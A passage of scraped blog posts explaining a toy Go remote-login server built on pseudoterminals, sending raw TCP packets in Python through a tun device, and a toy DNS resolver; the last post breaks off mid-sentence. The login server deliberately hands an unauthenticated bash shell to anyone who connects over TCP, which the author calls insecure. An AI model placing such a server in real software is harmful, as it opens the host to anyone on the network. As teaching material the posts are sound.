it locked to begin with?) but you have to do it for some reason \n open  /dev/pts/13  (or whatever number we got from  ptsname ) to get the “slave pseudoterminal device” \n \n\n What do those  ptsname  and  unlockpt  functions do? They just make some\n ioctl  system calls to the Linux kernel. All of the communication with the\nLinux kernel about terminals seems to be through various  ioctl  system calls. \n\n Here’s the code, it’s pretty short: (again, I just copied it from  creack/pty ) \n\n func ptsname(f *os.File) string {\n\tvar n uint32\n\tioctl(f.Fd(), syscall.TIOCGPTN, uintptr(unsafe.Pointer(&n)))\n\treturn \"/dev/pts/\" + strconv.Itoa(int(n))\n}\n\nfunc unlockpt(f *os.File) {\n\tvar u int32\n\t// use TIOCSPTLCK with a pointer to zero to clear the lock\n\tioctl(f.Fd(), syscall.TIOCSPTLCK, uintptr(unsafe.Pointer(&u)))\n}\n \n\n step 2: hook the pseudoterminal up to  bash \n\n The next thing we have to do is connect the pseudoterminal to  bash . Luckily,\nthat’s really easy – here’s the Go code for it! We just need to start a new\nprocess and set the stdin, stdout, and stderr to  tty . \n\n cmd := exec.Command(\"bash\")\ncmd.Stdin = tty\ncmd.Stdout = tty\ncmd.Stderr = tty\ncmd.SysProcAttr = &syscall.SysProcAttr{\n  Setsid: true,\n}\ncmd.Start()\n \n\n Easy! Though – why do we need this  Setsid: true  thing, you might ask? Well,\nI tried commenting out that code to see what went wrong. It turns out that what\ngoes wrong is – Ctrl + C doesn’t work anymore! \n\n Setsid: true  creates a new  session  for the new bash process. But why does\nthat make  Ctrl + C  work? How does Linux know which process to send  SIGINT \nto when you press  Ctrl + C , and what does that have to do with sessions? \n\n how does Linux know which process to send Ctrl + C to? \n\n I found this pretty confusing, so I reached for my favourite book for learning\nabout this kind of thing:  the linux programming interface , specifically chapter 34 on process groups\nand sessions. \n\n That chapter contains a few key facts: (#3, #4, and #5 are direct quotes from the book) \n\n \n Every process has a  session id  and a  process group id  (which may or may not be the same as its PID) \n A session is made up of multiple process groups \n All of the processes in a session share a single controlling terminal. \n A terminal may be the controlling terminal of at most one session. \n At any point in time, one of the process groups in a session is the\n foreground process group  for the terminal, and the others are background\nprocess groups. \n When you press  Ctrl+C  in a terminal, SIGINT gets sent to all the processes in the foreground process group \n \n\n What’s a process group? Well, my understanding is that: \n\n \n processes in the same pipe  x | y | z  are in the same process group \n processes you start on the same shell line ( x && y && z ) are in the same process group \n child processes are by default in the same process group, unless you explicitly decide otherwise \n \n\n I didn’t know most of this (I had no idea processes had a session ID!) so this\nwas kind of a lot to absorb. I tried to draw a sketchy ASCII art diagram of the\nsituation \n\n (maybe)  terminal --- session --- process group --- process\n                               |                 |- process\n                               |                 |- process\n                               |- process group \n                               |\n                               |- process group \n \n\n So when we press Ctrl+C in a terminal, here’s what I think happens: \n\n \n \\x04  gets written to the “pseudoterminal master” of a terminal \n Linux finds the  session  for that terminal (if it exists) \n Linux find the  foreground process group  for that session \n Linux sends  SIGINT \n \n\n If we don’t create a new session for our new bash process, our new pseudoterminal\nactually won’t have  any  session associated with it, so nothing happens when\nwe press  Ctrl+C . But if we do create a new session, then the new\npseudoterminal will have the new session associated with it. \n\n how to get a list of all your sessions \n\n As a quick aside, if you want to get a list of all the sessions on your Linux\nmachine, grouped by session, you can run: \n\n $ ps -eo user,pid,pgid,sess,cmd | sort -k3\n \n\n This includes the PID, process group ID, and session ID. As an example of the output, here are the two processes in the pipeline: \n\n bork       58080   58080   57922 ps -eo user,pid,pgid,sess,cmd\nbork       58081   58080   57922 sort -k3\n \n\n You can see that they share the same process group ID and session ID, but of\ncourse they have different PIDs. \n\n That was kind of a lot but that’s all we’re going to say about sessions and\nprocess groups in this post. Let’s keep going! \n\n step 3: set the window size \n\n We need to tell the terminal how big to be! \n\n Again, I just copied this from  creack/pty . I decided to hardcode the size to 80x24. \n\n Setsize(tty, &Winsize{\n\t\tCols: 80,\n\t\tRows: 24,\n\t})\n \n\n Like with getting the terminal’s pts filename and unlocking it, setting the\nsize is just one  ioctl  system call: \n\n func Setsize(t *os.File, ws *Winsize) {\n\tioctl(t.Fd(), syscall.TIOCSWINSZ, uintptr(unsafe.Pointer(ws)))\n}\n \n\n Pretty simple! We could do something smarter and get the real window size, but\nI’m too lazy. \n\n step 4: copy information between the TCP connection and the pseudoterminal \n\n As a reminder, our rough steps to set up this remote login server were: \n\n \n create a pseudoterminal for the client to use \n start a  bash  shell process \n connect  bash  to the pseudoterminal \n continuously copy information back and forth between the TCP connection and\nthe pseudoterminal \n \n\n We’ve done 1, 2, and 3, now we just need to ferry information between the TCP\nconnection and the pseudoterminal. \n\n There are two  io.Copy  calls, one to copy the input  from  the tcp connection, and one to copy the output  to  the TCP connection. Here’s what the code looks like: \n\n \tgo func() {\n\t\t\tio.Copy(pty, conn)\n\t}()\n  io.Copy(conn, pty)\n \n\n The first one is in a goroutine just so they can both run in parallel. \n\n Pretty simple! \n\n step 5: exit when we’re done \n\n I also added a little bit of code to close the TCP connection when the command exits \n\n go func() {\n  cmd.Wait()\n  conn.Close()\n}()\n\n \n\n And that’s it for the server!  You can see all of the Go code here:  server.go . \n\n next: write a client \n\n Next, we have to write a client. This is a lot easier than the server because we don’t need to do quite as much terminal setup. There are just 3 steps: \n\n \n Put the terminal into raw mode \n copy stdin/stdout to the TCP connection \n reset the terminal \n \n\n client step 1: put the terminal into “raw” mode \n\n We need to put the client terminal into “raw” mode so that every time you press\na key, it gets sent to the TCP connection immediately. If we don’t do this,\neverything will only get sent when you press enter. \n\n “Raw mode” isn’t actually a single thing, it’s a bunch of flags that you want\nto turn off. There’s a good tutorial explaining all the flags we have to turn\noff called  Entering raw mode . \n\n Like everything else with terminals, this requires  ioctl  system calls. In\nthis case we get the terminal’s current settings, modify them, and save the old\nsettings so that we can restore them later. \n\n I figured out how to do this in Go by going to  https://grep.app  and typing in\n syscall.TCSETS  to find some other Go code that was doing the same thing. \n\n func MakeRaw(fd uintptr) syscall.Termios {\n\t// from https://github.com/getlantern/lantern/blob/devel/archive/src/golang.org/x/crypto/ssh/terminal/util.go\n\tvar oldState syscall.Termios\n\tioctl(fd, syscall.TCGETS, uintptr(unsafe.Pointer(&oldState)))\n\n\tnewState := oldState\n\tnewState.Iflag &^= syscall.ISTRIP | syscall.INLCR | syscall.ICRNL | syscall.IGNCR | syscall.IXON | syscall.IXOFF\n\tnewState.Lflag &^= syscall.ECHO | syscall.ICANON | syscall.ISIG\n\tioctl(fd, syscall.TCSETS, uintptr(unsafe.Pointer(&newState)))\n\treturn oldState\n}\n \n\n client step 2: copy stdin/stdout to the TCP connection \n\n This is exactly like what we did with the server. It’s very little code: \n\n go func() {\n\t\tio.Copy(conn, os.Stdin)\n\t}()\n\tio.Copy(os.Stdout, conn)\n \n\n client step 3: restore the terminal’s state \n\n We can put the terminal back into the mode it started in like this (another  ioctl !): \n\n func Restore(fd uintptr, oldState syscall.Termios) {\n\tioctl(fd, syscall.TCSETS, uintptr(unsafe.Pointer(&oldState)))\n}\n \n\n we did it! \n\n We have written a tiny remote login server that lets anyone log in! Hooray! \n\n Obviously this has zero security so I’m not going to talk about that aspect. \n\n it’s running on the public internet! you can try it out! \n\n For the next week or so I’m going to run a demo of this on the internet at\n tetris.jvns.ca . It runs tetris instead of a shell because I wanted to avoid\nabuse, but if you want to try it with a shell you can run it on your own\ncomputer :). \n\n If you want to try it out, you can use  netcat  as a client instead of the\ncustom Go client program we wrote, because copying information to/from a TCP\nconnection is what netcat does. Here’s how: \n\n stty raw -echo && nc tetris.jvns.ca 7777 && stty sane\n \n\n This will let you play a terminal tetris game called  tint . \n\n You can also use the  client.go program  and run  go run client.go tetris.jvns.ca 7777 . \n\n this is not a good protocol \n\n This protocol where we just copy bytes from the TCP connection to the terminal\nand nothing else is not good because it doesn’t allow us to send over\ninformation information like the terminal or the actual window size of the\nterminal. \n\n I thought about implementing telnet’s protocol so that we could use telnet as a\nclient, but I didn’t feel like figuring out how telnet works so I didn’t. (the\nserver 30% works with telnet as is, but a lot of things are broken, I don’t\nquite know why, and I didn’t feel like figuring it out) \n\n it’ll mess up your terminal a bit \n\n As a warning: using this server to play tetris will probably mess up your\nterminal a bit because it sets the window size to 80x24. To fix that I just\nclosed the terminal tab after running that command. \n\n If we wanted to fix this for real, we’d need to restore the window size after\nwe’re done, but then we’d need a slightly more real protocol  than “just\nblindly copy bytes back and forth with TCP” and I didn’t feel like doing that. \n\n Also it sometimes takes a second to disconnect after the program exits for some\nreason, I’m not sure why that is. \n\n other tiny projects \n\n That’s all! There are a couple of other similar toy implementations of programs\nI’ve written here: \n\n \n toy tls 1.3 implementation \n toy dns resolver \n \n\n"},
{"url": "https://jvns.ca/blog/2022/09/06/send-network-packets-python-tun-tap/", "title": "How to send raw network packets in Python with tun/tap", "content": "\n     \n\n Hello! \n\n Recently I’ve been working on a project where I implement a bunch of tiny toy\nworking versions of computer networking protocols in Python without using any\nlibraries, as a way to explain how computer networking works. \n\n I’m still working on writing up that project, but today I wanted to talk about\nhow to do the very first step: sending network packets in Python. \n\n In this post we’re going to send a SYN packet (the first packet in a TCP\nconnection) from a tiny Python program, and get a reply from  example.com . All the code from this post is in  this gist . \n\n what’s a network packet? \n\n A network packet is a byte string. For example, here’s the first packet in a TCP connection: \n\n b'E\\x00\\x00,\\x00\\x01\\x00\\x00@\\x06\\x00\\xc4\\xc0\\x00\\x02\\x02\"\\xc2\\x95Cx\\x0c\\x00P\\xf4p\\x98\\x8b\\x00\\x00\\x00\\x00`\\x02\\xff\\xff\\x18\\xc6\\x00\\x00\\x02\\x04\\x05\\xb4'\n \n\n I’m not going to talk about the structure of this byte string in this post\n(though I’ll say that this particular byte string has two parts: the first 20\nbytes are the IP address part and the rest is the TCP part) \n\n The point is that to send network packets, we need to be able to send and\nreceive strings of bytes. \n\n why tun/tap? \n\n The problem with writing your own TCP implementation on Linux (or any operating\nsystem) is – the Linux kernel already has a TCP implementation! \n\n So if you send out a SYN packet on your normal network interface to a host like\nexample.com, here’s what will happen: \n\n \n you send a SYN packet to example.com \n example.com replies with a SYN ACK (so far so good!) \n the Linux kernel on your machine gets the SYN ACK, thinks “wtf?? I didn’t make this connection??”, and closes the connection \n you’re sad. no TCP connection for you. \n \n\n I was talking to a friend about this problem a few years ago and he said “you\nshould use tun/tap!“. It took quite a few hours to figure out how to do that\nthough, which is why I’m writing this blog post :) \n\n tun/tap gives you a “virtual network device” \n\n The way I like to think of  tun/tap  is – imagine I have a tiny computer in my\nnetwork which is sending and receiving network packets. But instead of it being\na real computer, it’s just a Python program I wrote. \n\n That explanation is honestly worse than I would like. I wish I understood\nexactly how tun/tap devices interfaced with the real Linux network stack but\nunfortunately I do not, so “virtual network device” is what you’re getting.\nHopefully the code examples below will make all it a bit more clear. \n\n tun vs tap \n\n The system called “tun/tap” lets you create two kinds of network interfaces: \n\n \n “tun”, which lets you set IP-layer packets \n “tap”, which lets you set Ethernet-layer packets \n \n\n We’re going to be using  tun , because that’s what I could figure out how to\nget to work. It’s possible that tap would work too. \n\n how to create a tun interface \n\n Here’s how I created a tun interface with IP address 192.0.2.2. \n\n sudo ip tuntap add name tun0 mode tun user $USER\nsudo ip link set tun0 up\nsudo ip addr add 192.0.2.1 peer 192.0.2.2 dev tun0\n\nsudo iptables -t nat -A POSTROUTING -s 192.0.2.2 -j MASQUERADE\nsudo iptables -A FORWARD -i tun0 -s 192.0.2.2 -j ACCEPT\nsudo iptables -A FORWARD -o tun0 -d 192.0.2.2 -j ACCEPT\n \n\n These commands do two things: \n\n \n Create the  tun  device with the IP  192.0.2.2  (and give your user access to write to it) \n set up  iptables  to proxy packets from that tun device to the internet using NAT \n \n\n The iptables part is very important because otherwise the packets would only\nexist inside my computer and wouldn’t be sent to the internet, and what fun\nwould that be? \n\n I’m not going to explain this  ip addr add  command because I don’t understand\nit, I find  ip  to be very inscrutable and for now I’m resigned to just copying\nand pasting  ip  commands without fully understanding them. It does work\nthough. \n\n how to connect to the tun interface in Python \n\n Here’s a function to open a tun interface, you call it like  openTun('tun0') .\nI figured out how to write it by searching through the\n scapy  source code for “tun”. \n\n import struct\nfrom fcntl import ioctl\n\ndef openTun(tunName):\n    tun = open(\"/dev/net/tun\", \"r+b\", buffering=0)\n    LINUX_IFF_TUN = 0x0001\n    LINUX_IFF_NO_PI = 0x1000\n    LINUX_TUNSETIFF = 0x400454CA\n    flags = LINUX_IFF_TUN | LINUX_IFF_NO_PI\n    ifs = struct.pack(\"16sH22s\", tunName, flags, b\"\")\n    ioctl(tun, LINUX_TUNSETIFF, ifs)\n    return tun\n \n\n All this is doing is \n\n \n opening  /dev/net/tun  in binary mode \n calling an  ioctl  to tell Linux that we want a  tun  device, and that the one we want is called  tun0  (or whatever  tunName  we’ve passed to the function). \n \n\n Once it’s open, we can  read  from and  write  to it like any other file in Python. \n\n let’s send a SYN packet! \n\n Now that we have the  openTun  function, we can send a SYN packet! \n\n Here’s what the Python code looks like, using the  openTun  function. \n\n syn = b'E\\x00\\x00,\\x00\\x01\\x00\\x00@\\x06\\x00\\xc4\\xc0\\x00\\x02\\x02\"\\xc2\\x95Cx\\x0c\\x00P\\xf4p\\x98\\x8b\\x00\\x00\\x00\\x00`\\x02\\xff\\xff\\x18\\xc6\\x00\\x00\\x02\\x04\\x05\\xb4'\ntun = openTun(b\"tun0\")\ntun.write(syn)\nreply = tun.read(1024)\nprint(repr(reply))\n \n\n If I run this as  sudo python3 syn.py , it prints out the reply from  example.com : \n\n b'E\\x00\\x00,\\x00\\x00@\\x00&\\x06\\xda\\xc4\"\\xc2\\x95C\\xc0\\x00\\x02\\x02\\x00Px\\x0cyvL\\x84\\xf4p\\x98\\x8c`\\x12\\xfb\\xe0W\\xb5\\x00\\x00\\x02\\x04\\x04\\xd8'\n \n\n Obviously this is a pretty silly way to send a SYN packet – a real\nimplementation would have actual code to generate that byte string instead of\nhardcoding it, and we would parse the reply instead of just printing out the\nraw byte string. But I didn’t want to go into the structure of TCP in this post\nso that’s what we’re doing. \n\n looking at these packets with tcpdump \n\n If we run tcpdump on the  tun0  interface, we can see the packet we sent and the answer from  example.com : \n\n $ sudo tcpdump -ni tun0\n12:51:01.905933 IP 192.0.2.2.30732 > 34.194.149.67.80: Flags [S], seq 4101019787, win 65535, options [mss 1460], length 0\n12:51:01.932178 IP 34.194.149.67.80 > 192.0.2.2.30732: Flags [S.], seq 3300937416, ack 4101019788, win 64480, options [mss 1240], length 0\n \n\n Flags [S]  is the SYN we sent, and  Flags [S.]  is the SYN ACK packet in\nresponse! We successfully communicated! And the Linux network stack didn’t\ninterfere at all! \n\n tcpdump also shows us how NAT is working \n\n We can also run  tcpdump  on my real network interface ( wlp3so , my wireless card), to see the packets being sent and received. We’ll pass  -i wlp3s0  instead of  -i tun0 . \n\n $ sudo tcpdump -ni wlp3s0 host 34.194.149.67\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on wlp3s0, link-type EN10MB (Ethernet), snapshot length 262144 bytes\n12:56:01.204382 IP 192.168.1.181.30732 > 34.194.149.67.80: Flags [S], seq 4101019787, win 65535, options [mss 1460], length 0\n12:56:01.228239 IP 34.194.149.67.80 > 192.168.1.181.30732: Flags [S.], seq 144769955, ack 4101019788, win 64480, options [mss 1240], length 0\n12:56:05.334427 IP 34.194.149.67.80 > 192.168.1.181.30732: Flags [S.], seq 144769955, ack 4101019788, win 64480, options [mss 1240], length 0\n12:56:13.524973 IP 34.194.149.67.80 > 192.168.1.181.30732: Flags [S.], seq 144769955, ack 4101019788, win 64480, options [mss 1240], length 0\n12:56:29.705007 IP 34.194.149.67.80 > 192.168.1.181.30732: Flags [S.], seq 144769955, ack 4101019788, win 64480, options [mss 1240], length 0\n \n\n A couple of things to notice here: \n\n \n The IP addresses are different – that IPtables rule from above has rewritten them from  192.0.2.2  to  192.168.1.181 . This rewriting is called “network address translation”, or “NAT”. \n We’re getting a bunch of replies from  example.com  – it’s doing an\nexponential backoff where it retries after 4 seconds, then 8 seconds, then 16\nseconds. This is because we didn’t finish the TCP handshake – we just sent a\nSYN and left it hanging! There’s actually a type of DDOS attack like this\ncalled SYN flooding, but just sending one or two SYN packets isn’t a big\ndeal. \n I had to add  host 34.194.149.67  because there are a lot of TCP packets being sent on my real wifi connection so I needed to ignore those \n \n\n I’m not totally sure why we see more SYN replies on  wlp3s0  than on  tun0 , my\nguess is that it’s because we only read 1 reply in our Python program. \n\n this is pretty easy and really reliable \n\n The last time I tried to implement TCP in Python I did it with something called\n“ARP spoofing”. I won’t talk about that here (there are some posts about it on\nthis blog back in 2013), but this way is a lot more reliable. \n\n And ARP spoofing is kind of a sketchy thing to do on a network you don’t own. \n\n here’s the code \n\n I put all the code from this blog post in  this gist , if you want to try it yourself, you can run \n\n bash setup.sh # needs to run as root, has lots of `sudo` commands\npython3 syn.py # runs as a regular user\n \n\n It only works on Linux, but I think there’s a way to set up tun/tap on Mac too. \n\n a plug for scapy \n\n I’ll close with a plug for  scapy  here: it’s a really\ngreat Python networking library for doing this kind of experimentation without\nwriting all the code yourself. \n\n This post is about writing all the code yourself though so I won’t say more\nabout it than that. \n\n"},
{"url": "https://jvns.ca/blog/2022/02/01/a-dns-resolver-in-80-lines-of-go/", "title": "A toy DNS resolver", "content": "\n     \n\n Hello! I wrote a comic last week called “life of a DNS query” that explains how\nDNS resolvers work. \n\n In this post, I want to explain how DNS resolvers work in a different way –\nwith a short Go program that does the same thing described in the comic.\nThe main function ( resolve ) is actually just 20 lines, including comments. \n\n I usually find it easier to understand things work when they come in the form\nof programs that I can run and modify and poke at, so hopefully this program\nwill be helpful to some of you. \n\n The program is here:  https://github.com/jvns/tiny-resolver/blob/main/resolve.go \n\n what’s a DNS resolver? \n\n When your browser needs to make a DNS query, it asks a  DNS resolvers . When\nthey start, DNS resolvers don’t know any DNS records (except the IP addresses\nof the root nameservers). But they  do  know how to find DNS records for you. \n\n Here’s the “life of a DNS query” comic, which explains how DNS resolvers find DNS records for you. \n\n \n \n \n\n we’ll use a library for parsing DNS packets. \n\n I’m not going to write this completely from scratch – I think parsing DNS\npackets is really interesting, but it’s definitely more than 80 lines of\ncode, and I find that it kind of distracts from the algorithm. \n\n I really recommend writing a toy DNS resolver that actually does the parsing of\nDNS packets if you want to learn about binary protocols though, it’s really fun\nand it’s a totally doable to get something basic working in a weekend. \n\n So I’ve used  https://github.com/miekg/dns  for creating and parsing the DNS packets. \n\n DNS responses contain 4 sections \n\n You might think of DNS queries as just being a question and an answer (“what’s\nthe IP for  example.com ? It’s  93.184.216.34 !). But actually DNS responses\ncontain 4 sections, and we need to use all 4 sections to write our DNS\nresolver. So let’s explain what they are. \n\n Here’s the  Msg  struct from the  miekg/dns  library, which lists the sections. \n\n type Msg struct {\n        MsgHdr\n        Compress bool       `json:\"-\"` // If true, the message will be compressed when converted to wire format.\n        Question []Question // Holds the RR(s) of the question section.\n        Answer   []RR       // Holds the RR(s) of the answer section.\n        Ns       []RR       // Holds the RR(s) of the authority section.\n        Extra    []RR       // Holds the RR(s) of the additional section.\n}\n \n\n Section 1: Question . This is the section you use when you’re creating a\nquery. There’s not much to it – it just has a query name (like  jvns.ca. ), a\ntype (like  A , but encoded as an integer), and a class (which is always the\nsame these days, “internet”). \n\n Here’s what the Question struct  miekg/dns  looks like: \n\n type Question struct {\n        Name   string `dns:\"cdomain-name\"` // \"cdomain-name\" specifies encoding (and may be compressed)\n        Qtype  uint16\n        Qclass uint16\n}\n \n\n Section 2: Answer . When you make a request like this: \n\n $ dig +short google.com\n93.184.216.34\n \n\n the IP address  93.184.216.34  comes from the  Answer  section. \n\n The Answer, Authority, and Additional sections all contain  DNS records .\nDifferent types of records have different formats, but they all contain a  name ,  type ,  class , and  TTL \n\n Here’s what the shared header looks like in  miekg/dns : \n\n type RR_Header struct {\n        Name     string `dns:\"cdomain-name\"`\n        Rrtype   uint16\n        Class    uint16\n        Ttl      uint32\n        Rdlength uint16 // Length of data after header.\n}\n \n\n “RR” stands for “Resource Record”. \n\n Section 3: Authority . When a nameserver redirects you to another server\n(“ask  a.iana-servers.net  instead!“), this is the section it uses.  miekg/dns \ncalls this section  Ns  instead of  Authority , I guess because it contains\n NS  records. \n\n Here’s an example of an record in the Authority section of a DNS response. \n\n $ dig +noall +authority @h.root-servers.net example.com \ncom.\t\t\t172800\tIN\tNS\ta.gtld-servers.net.\ncom.\t\t\t172800\tIN\tNS\tb.gtld-servers.net.\n \n\n The Authority section can also contain SOA records but that’s not relevant to\nthis post so I’m not going to talk about that. \n\n Section 4: Additional . This is where “glue records” live. What’s a glue\nrecord? Well, basically when a nameserver redirects you to another server,\noften it’ll include the IP address of that server as well. \n\n Here are the glue records from the same query above. \n\n $ dig +noall +additional @h.root-servers.net example.com \na.gtld-servers.net.\t172800\tIN\tA\t192.5.6.30\nb.gtld-servers.net.\t172800\tIN\tA\t192.33.14.30\n \n\n There are other things in the Additional section as well, not just glue\nrecords, but they’re not relevant to this blog post so I’m not going to talk\nabout them. \n\n the basic  resolve  function is pretty short \n\n Now that we’ve talked about the different sections in a DNS response, I can explain the resolver code. \n\n Let’s jump into the main function for resolving a name to an IP address. \n\n name  here is a domain name, like  example.com. \n\n func resolve(name string) net.IP {\n   // We always start with a root nameserver\n   nameserver := net.ParseIP(\"198.41.0.4\")\n   for {\n      reply := dnsQuery(name, nameserver)\n      if ip := getAnswer(reply); ip != nil { // look in the \"Answer\" section\n         // Best case: we get an answer to our query  and we're done\n         return ip\n      } else if nsIP := getGlue(reply); nsIP != nil { // look in the \"Additional\" section\n            // Second best: we get a \"glue record\" with the *IP address* of\n            // another nameserver to query \n         nameserver = nsIP\n      } else if domain := getNS(reply); domain != \"\" { // look in the \"Authority\" section\n            // Third best: we get the *domain name* of another nameserver to\n            // query, which we can look up the IP for\n         nameserver = resolve(domain)\n      } else {\n         // If there's no A record we just panic, this is not a very good\n         // resolver :)\n         panic(\"something went wrong\")\n      }\n   }\n}\n \n\n Here’s what that  resolve  function is doing: \n\n \n We start with the root nameserver \n Then we do a loop:\n\n \n Query the nameserver and parse the response \n Look in the “Answer” section for a response. If we find one, we’re done \n Look in the “Additional” section for a glue record. If we find one, use that as the nameserver for the next query \n Look in the “Authority” section for a nameserver domain. If we find one, look up its IP and then use that IP as the nameserver for the next query \n \n \n\n That’s basically the whole program. There are a few helper functions to get\nrecords out of the DNS response and to make DNS queries but I don’t think\nthey’re that interesting so I won’t explain them. \n\n the output \n\n The resolver prints out all DNS queries it made, and the record it used to figure out what query to make it next. \n\n It prints out  dig -r @SERVER DOMAIN  for each query even though it’s not\nactually using  dig  to make the query because I liked being able to run\nthe same query myself from the command line to see the response myself, for\ndebugging purposes. \n\n -r  just means “ignore what’s in  .digrc ”, it’s there because I have some\noptions in my  .digrc   ( +noall +answer ) that I wanted to disable when\ndebugging. \n\n Let’s look at 3 examples of the output. \n\n example 1: jvns.ca \n\n $ go run resolve.go jvns.ca.\ndig -r @198.41.0.4 jvns.ca.\n   any.ca-servers.ca.\t172800\tIN\tA\t199.4.144.2\ndig -r @199.4.144.2 jvns.ca.\n   jvns.ca.\t86400\tIN\tNS\tart.ns.cloudflare.com.\ndig -r @198.41.0.4 art.ns.cloudflare.com.\n   a.gtld-servers.net.\t172800\tIN\tA\t192.5.6.30\ndig -r @192.5.6.30 art.ns.cloudflare.com.\n   ns3.cloudflare.com.\t172800\tIN\tA\t162.159.0.33\ndig -r @162.159.0.33 art.ns.cloudflare.com.\n   art.ns.cloudflare.com.\t900\tIN\tA\t173.245.59.102\ndig -r @173.245.59.102 jvns.ca.\n   jvns.ca.\t256\tIN\tA\t172.64.80.1\n \n\n We can see it had to make 6 DNS queries, 3 to look up  jvns.ca  and 3 to look up  jvns.ca ’s nameserver,  art.ns.cloudflare.com \n\n example 2: archive.org \n\n $ go run resolve.go archive.org.\ndig -r @198.41.0.4 archive.org.\n   a0.org.afilias-nst.info.\t172800\tIN\tA\t199.19.56.1\ndig -r @199.19.56.1 archive.org.\n   ns1.archive.org.\t86400\tIN\tA\t208.70.31.236\ndig -r @208.70.31.236 archive.org.\n   archive.org.\t300\tIN\tA\t207.241.224.2\nResult: 207.241.224.2\n \n\n This one only had to make 3 DNS queries. This is because there was a glue\nrecord available for archive.org’s nameserver ( ns1.archive.org. ). \n\n example 3: www.maths.ox.ac.uk \n\n One last example: let’s look up  www.maths.ox.ac.uk . There’s a reason for this one, I promise! \n\n dig -r @198.41.0.4 www.maths.ox.ac.uk.\n   dns1.nic.uk.\t172800\tIN\tA\t213.248.216.1\ndig -r @213.248.216.1 www.maths.ox.ac.uk.\n   ac.uk.\t172800\tIN\tNS\tns0.ja.net.\ndig -r @198.41.0.4 ns0.ja.net.\n   e.gtld-servers.net.\t172800\tIN\tA\t192.12.94.30\ndig -r @192.12.94.30 ns0.ja.net.\n   ns0.ja.net.\t172800\tIN\tA\t128.86.1.20\ndig -r @128.86.1.20 ns0.ja.net.\n   ns0.ja.net.\t86400\tIN\tA\t128.86.1.20\ndig -r @128.86.1.20 www.maths.ox.ac.uk.\n   ns2.ja.net.\t86400\tIN\tA\t193.63.105.17\ndig -r @193.63.105.17 www.maths.ox.ac.uk.\n   www.maths.ox.ac.uk.\t300\tIN\tA\t129.67.184.128\nResult: 129.67.184.128\n \n\n This makes  7  DNS queries, which is more than  jvns.ca , which only needed\n6. Why does it make 7 DNS queries instead of 6? \n\n Well, it’s because there are 4 nameservers involved in resolving  www.maths.ox.ac.uk  instead of 3. They are: \n\n \n the  .  nameserver \n the  uk.  nameserver \n the  ac.uk.  nameserver \n the  ox.ac.uk.  nameserver \n \n\n You could even imagine there being a 5th one (a  maths.ox.ac.uk.  nameserver), but there isn’t in this case. \n\n jvns.ca only involves 3 nameservers: \n\n \n the  .  nameserver \n the  ca.  nameserver \n the  jvns.ca.  nameserver \n \n\n real DNS resolvers actually make more queries than this \n\n When my resolver resolves  reddit.com. , it only makes 3 DNS queries. \n\n $ go run resolve.go reddit.com.\ndig -r @198.41.0.4 reddit.com.\n   e.gtld-servers.net.\t172800\tIN\tA\t192.12.94.30\ndig -r @192.12.94.30 reddit.com.\n   ns-378.awsdns-47.com.\t172800\tIN\tA\t205.251.193.122\ndig -r @205.251.193.122 reddit.com.\n   reddit.com.\t300\tIN\tA\t151.101.129.140\nResult: 151.101.129.140\n \n\n But when  unbound  (the actual DNS resolver that I have running on my laptop)\nresolves reddit.com, it makes more DNS queries. I captured them with  tcpdump \nto see what they were. \n\n This  tcpdump  output might be a little illegible because well, that’s how\ntcpdump is, but hopefully it makes some sense. \n\n Unbound skips the first step, because it has the address of the  com. \nnameserver cached.  Then the next 2 queries  unbound  makes are exactly the\nsame as my tiny Go resolver, except that it sends its first query to\n k.gtld-servers.net  instead of  e.gtld-servers.net : \n\n 12:38:35.479222 wlp3s0 Out IP pomegranate.19946 > k.gtld-servers.net.domain: 51686% [1au] A? reddit.com. (39)\n12:38:35.757033 wlp3s0 Out IP pomegranate.29111 > ns-378.awsdns-47.com.domain: 8859% [1au] A? reddit.com. (39)\n \n\n But then it keeps making DNS queries, even after it’s done resolving  reddit.com : \n\n 12:38:35.757033 wlp3s0 Out IP pomegranate.29111 > ns-378.awsdns-47.com.domain: 8859% [1au] A? reddit.com. (39)\n12:38:35.757396 wlp3s0 Out IP pomegranate.31913 > ns-1775.awsdns-29.co.uk.domain: 54236% [1au] A? ns-378.awsdns-47.com. (49)\n12:38:35.757761 wlp3s0 Out IP pomegranate.62059 > g.gtld-servers.net.domain: 28793% [1au] A? awsdns-05.net. (42)\n12:38:35.757955 wlp3s0 Out IP pomegranate.34743 > b0.org.afilias-nst.org.domain: 24975% [1au] A? awsdns-00.org. (42)\n12:38:35.758051 wlp3s0 Out IP pomegranate.8977 > a0.org.afilias-nst.info.domain: 53387% [1au] A? awsdns-00.org. (42)\n12:38:35.758285 wlp3s0 Out IP pomegranate.11376 > j.gtld-servers.net.domain: 41181% [1au] A? awsdns-05.net. (42)\n12:38:35.775497 wlp3s0 In  IP ns-378.awsdns-47.com.domain > pomegranate.29111: 8859*-$ 4/4/1 A 151.101.1.140, A 151.101.129.140, A 151.101.65.140, A 151.101.193.140 (240)\n12:38:35.775948 lo    In  IP localhost.domain > localhost.34429: 4033 4/0/1 A 151.101.1.140, A 151.101.129.140, A 151.101.65.140, A 151.101.193.140 (103)\n# now it's done -- it returned its DNS response!\n# but it keeps making queries about reddit.com's nameservers...\n12:38:35.843811 wlp3s0 Out IP pomegranate.44738 > ns-706.awsdns-24.net.domain: 14817% [1au] A? ns-1029.awsdns-00.org. (50)\n12:38:35.845563 wlp3s0 Out IP pomegranate.55655 > ns-1027.awsdns-00.org.domain: 3120% [1au] A? ns-1029.awsdns-00.org. (50)\n12:38:36.017618 wlp3s0 Out IP pomegranate.53397 > ns-775.awsdns-32.net.domain: 32671% [1au] A? ns-557.awsdns-05.net. (49)\n12:38:36.045151 wlp3s0 Out IP pomegranate.40525 > ns-454.awsdns-56.com.domain: 20823% [1au] A? ns-557.awsdns-05.net. (49)\n \n\n So that’s kind of interesting. I guess it makes sense that unbound would want\nto cache more nameserver addresses in case it needs them in the future. Or\nmaybe that’s what the DNS specification says to do? \n\n is this a “recursive” program? \n\n DNS resolvers are often called “recursive nameservers”. I’ve stopped using that\nterminology myself in explanations, but as far as I can tell, this is because\nthe  resolve  function is often a recursive function. \n\n And the  resolve  function I wrote is definitely recursive! But I ran this\nprogram on 500 different domains, and these are the number of times it\nrecursed: \n\n \n Sometimes 0 times (the function never calls itself) \n Sometimes 1 time (the function calls itself once, to look up the IP address of one nameserver) \n Very rarely 2 times (like for example to resolve  abc.net.au.  right now it needs to look up  r.au. , then  eur2.akam.net.  then  abc.net.au. ) \n So far, never 3 times \n \n\n Maybe there’s a domain that this function would recurse more than 2 times on, but I don’t know. \n\n You definitely  could  